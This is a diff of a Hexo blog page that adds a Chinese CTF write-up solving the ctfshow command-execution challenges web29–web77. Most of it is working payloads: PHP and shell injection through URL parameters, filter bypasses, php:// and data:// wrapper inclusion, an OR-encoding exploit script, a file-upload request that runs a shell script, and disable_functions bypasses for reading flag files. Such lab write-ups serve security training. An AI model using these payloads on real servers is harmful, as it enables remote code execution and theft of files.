@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFer 网络安全 渗透测试">
+    <meta name="keywords" content="CTFSHOW命令执行, CTFer 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>孤独星球</title>
+    <title>CTFSHOW命令执行 | 孤独星球</title>
 
     <link rel="icon" type="image/jpeg" href="https://i.loli.net/2021/11/10/guPx1Olpo6HIYai.jpg">
 
@@ -447,12 +447,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020616.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">CTFSHOW命令执行</h1>
                 </div>
             </div>
         </div>
@@ -571,9 +571,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                                <span class="chip bg-color">做题记录</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -585,28 +589,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-10
+                    2021-11-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-10
+                    2021-11-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 
@@ -624,7 +628,296 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                wvlc3L96QK
+                <h1 id="CTFSHOW命令执行"><a href="#CTFSHOW命令执行" class="headerlink" title="CTFSHOW命令执行"></a>CTFSHOW命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>过滤了<code>flag</code></p>
+<p>payload：</p>
+<p>随便写几个姿势</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=system("nl fl??????");
+/?c=system("nl fl*");
+/?c=system("nl fla''g.php");
+/?c=echo `nl fla""g.php`;
+/?c=echo `nl fla\g.php`;
+/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+/?c=eval($_GET[1]);&amp;1=system('nl flag.php');
+剩下的我不会了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>##web30</p>
+<p>过滤了<code>flag|system|php</code></p>
+<p>用echo 反引号来执行命令</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=echo `nl fla""g.p""hp`;
+/?c=echo `nl fla?????`;
+/?c=echo `nl f*`;
+/?c=eval($_GET[1]);&amp;1=system('nl flag.php');
+/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了<code>flag|system|php|cat|sort|shell|\.| |   </code></p>
+<p>没关系，我们有都是姿势</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
+/?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>##web32</p>
+<p><code>include不用括号，分号可以用?&gt;代替。</code></p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;
+/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system("cat flag.php");?&gt;
+/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//flag in flag.php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+/?c=data://text/palin,&lt;?php system("nl fla*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>过滤了<code>flag</code></p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=data://text/palin,&lt;?php%20system("nl%20f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>理论上是异或</p>
+<p>然后我懒</p>
+<p>贴exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+content <span class="token operator">=</span> <span class="token string">''</span>
+preg <span class="token operator">=</span> <span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            k <span class="token operator">=</span> i <span class="token operator">|</span> j
+            <span class="token keyword">if</span> k<span class="token operator">&gt;=</span><span class="token number">32</span> <span class="token keyword">and</span> k<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>
+                a <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+                b <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+                content <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span><span class="token operator">+</span> a <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rce_or.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span>
+import requests
+import urllib
+from sys import <span class="token operator">*</span>
+import os
+os<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">#没有将php写入环境变量需手动运行</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'USER：python exp.py &lt;url&gt;'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>
+    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+def <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    s1<span class="token operator">=</span><span class="token double-quoted-string string">""</span>
+    s2<span class="token operator">=</span><span class="token double-quoted-string string">""</span>
+    <span class="token keyword">for</span> i in arg<span class="token punctuation">:</span>
+        f<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>
+            t<span class="token operator">=</span>f<span class="token punctuation">.</span><span class="token function">readline</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token double-quoted-string string">""</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>
+                <span class="token shell-comment comment">#print(i)</span>
+                s1<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
+                s2<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+                <span class="token keyword">break</span>
+        f<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    output<span class="token operator">=</span><span class="token double-quoted-string string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token double-quoted-string string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token double-quoted-string string">"\")"</span>
+    <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
+    
+<span class="token keyword">while</span> <span class="token boolean constant">True</span><span class="token punctuation">:</span>
+    param<span class="token operator">=</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    data<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token single-quoted-string string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span><span class="token function">unquote</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
+    r<span class="token operator">=</span>requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>exp取自<a target="_blank" rel="noopener" href="https://wp.ctf.show/d/137-ctfshow-web-web41/4">https://wp.ctf.show/d/137-ctfshow-web-web41/4</a></p>
+</blockquote>
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p><code>%0a</code>、<code>%26</code>、<code>||</code>截断</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a
+= =姿势就不写那么多了
+截断后看过滤自由发挥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p>过滤了<code>;|cat</code></p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>多过滤了个<code>flag</code></p>
+<p>通配符搞定</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl%20*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格被过滤了</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl$IFS*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web46-49"><a href="#web46-49" class="headerlink" title="web46-49"></a>web46-49</h2><p>过滤了<code>\;|cat|flag| |[0-9]|\\$|\*/</code></p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl%09fla\g.php||
+/?c=nl%09fla\g.php%0a
+/?c=nl%09fla''g.php%0a
+/?c=nl%09fla""g.php%0a
+/?c=vi%09fla\g.php%0a
+/?c=tac%09fla\g.php%0a
+/?c=uniq%09fla\g.php%0a
+/?c=nl&lt;fla''g.php||
+/?c=nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}/fl""ag%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}fla%''g.p''hp
+/?c=ca''t${IFS}fl??????
+/?c=ca''t${IFS}fl''ag.p''hp
+应该还有其他姿势<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=mv${IFS}fla?.php${IFS}t.tx''t
+爷给他改个名
+/?c=/bin/?at${IFS}f???????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p>= = 只能是数字</p>
+<p>对不起骚套路开始</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">/?c=/???/????64+????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
+</blockquote>
+<p>数据包：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /?c=.+/???/????????[@-[] HTTP/1.1
+Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080
+Content-Length: 329
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNM
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundarydZeuVbMPZVcyvpNM
+Content-Disposition: form-data; name="file"; filename="2.php"
+Content-Type: application/octet-stream
+
+#!/bin/sh
+cat /var/www/html/flag.php
+------WebKitFormBoundarydZeuVbMPZVcyvpNM
+Content-Disposition: form-data; name="submit"
+
+111
+------WebKitFormBoundarydZeuVbMPZVcyvpNM--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>##web58</p>
+<p>凑36</p>
+<p>-37取反=36</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">$((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>##web59</p>
+<p>绕过disable_functions</p>
+<p>我只想到一种</p>
+<p><code>file</code>可以把文件读取到一个数组，再打印出来</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=var_dump(file('flag.php'));
+c=highlight_file("flag.php");
+c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>##web60-65</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=highlight_file("flag.php");
+c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=var_dump(scandir("/"));
+扫描到flag 是txt
+然后日他妈的
+c=highlight_file('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web67-70"><a href="#web67-70" class="headerlink" title="web67-70"></a>web67-70</h2><p>= = 好家伙</p>
+<p>ban的真多</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');
+c=require('/flag.txt');
+c=require_once('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></p>
+<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在<strong>ob_end_clean()**之前调用<a href="function.ob-get-contents.html">ob_get_contents()</a>，因为当调用</strong>ob_end_clean()**时缓冲区内容将被丢弃。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187</a> y4的blog说的很清楚</p>
+</blockquote>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');;exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><blockquote>
+<p>看一下y4的blog就可以了= = payload不贴了 太长了。</p>
+</blockquote>
+<p>##web73</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">c=?&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看一下目录</p>
+<p>然后</p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">c=include('/flagc.txt');exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>同73题</p>
+<h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><p>扫目录</p>
+<pre class="line-numbers language-none"><code class="language-none">c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>mysql load_file读文件</p>
+<pre class="line-numbers language-none"><code class="language-none">c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
+'root');foreach($dbh-&gt;query('select load_file("/flag36.txt")') as $row)
+{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
+&gt;getMessage();exit(0);}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>##web77</p>
+<p>不是很清楚这个题怎么做</p>
+<p>但是我复现了一下</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></p>
+</blockquote>
+
                 
             </div>
             <hr/>
@@ -650,7 +943,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://h3h3qaq.github.io/baidu_verify_xxxxxxx.html">https://h3h3qaq.github.io/baidu_verify_xxxxxxx.html</a>
